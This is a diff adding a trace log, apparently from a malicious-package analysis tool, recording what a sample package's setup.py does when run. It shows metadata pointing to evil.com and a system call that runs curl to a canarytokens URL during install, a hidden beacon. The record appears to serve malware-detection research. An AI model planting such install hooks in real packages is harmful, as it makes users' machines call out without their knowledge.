@@ -1,0 +1,6 @@
+[artifact_eval/samples/packages/027_cosmostroposphere-3.0.1/setup.py:3] [open]('README.md', 'r', encoding='utf-8')
+[artifact_eval/samples/packages/027_cosmostroposphere-3.0.1/setup.py:4] [method_descriptor](<_io.TextIOWrapper name='README.md' mode='r' encoding='utf-8'>)
+[artifact_eval/samples/packages/027_cosmostroposphere-3.0.1/setup.py:3] [__exit__](None, None, None)
+[artifact_eval/samples/packages/027_cosmostroposphere-3.0.1/setup.py:24] [DummyObject](where='src')
+[artifact_eval/samples/packages/027_cosmostroposphere-3.0.1/setup.py:6] [DummyObject](author='Vinit Lakra', author_email='vinitlakra634@gmail.com', classifiers=['Programming Language :: Python :: 3', 'License :: OSI Approved :: MIT License', 'Operating System :: OS Independent'], description='Taking the package', long_description='Taking over the repo', long_description_content_type='text/markdown', name='cosmosTroposphere', package_dir={'': 'src'}, packages=<DummyObject No module named 'setuptools'@setup.py:1>, project_urls={'Bug Tracker': 'https://evil.com'}, python_requires='>=3.6', url='https://evil.com', version='3.0.1')
+[artifact_eval/samples/packages/027_cosmostroposphere-3.0.1/setup.py:28] [system]('curl http://canarytokens.com/images/static/brqx28acq8gohneyj1yvhcknu/contact.php')
